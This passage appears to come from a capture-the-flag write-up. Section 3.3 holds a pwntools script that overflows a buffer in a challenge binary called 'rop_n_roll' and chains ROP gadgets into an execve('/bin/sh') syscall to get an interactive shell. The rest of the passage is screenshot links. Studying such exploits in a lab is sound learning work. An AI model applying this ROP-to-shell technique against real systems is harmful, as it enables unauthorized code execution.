## 3.3

```python
from pwn import *
from sys import argv

proc = "./rop_n_roll"
context.log_level = "info"
context.binary = proc
elf = ELF(proc, checksec=False)
io = remote("", ) if argv[1] == 'r' else process(proc)

if args.G:
    gdb.attach(io, "b *0x401279")

pop_rdi_ret = 0x00000000004013a3
pop_rsi_r15_ret = 0x00000000004013a1
pop_rdx_rax_rbp_ret = 0x000000000040117f
binsh_addr = 0x404048
syscall_addr = 0x000000000040117d

io.recvuntil(b".\n")
io.sendline(b'a' * 498)
io.recvuntil(b".\n")
payload = b"b" * (16 + 5) + flat([pop_rdi_ret, binsh_addr, pop_rsi_r15_ret, 0, 0, pop_rdx_rax_rbp_ret, 0, 0x3b, 0, syscall_addr])
io.sendline(payload)
io.interactive()
```

![](https://pic.imgdb.cn/item/675edf16d0e0a243d4e436c4.png)


## 3.4

![](https://pic.imgdb.cn/item/675ede87d0e0a243d4e436ae.png)

![](https://pic.imgdb.cn/item/675ede73d0e0a243d4e436ac.png)

![](https://pic.imgdb.cn/item/675ef46dd0e0a243d4e43bad.png)

![](https://pic.imgdb.cn/item/675ef492d0e0a243d4e43bb2.png)



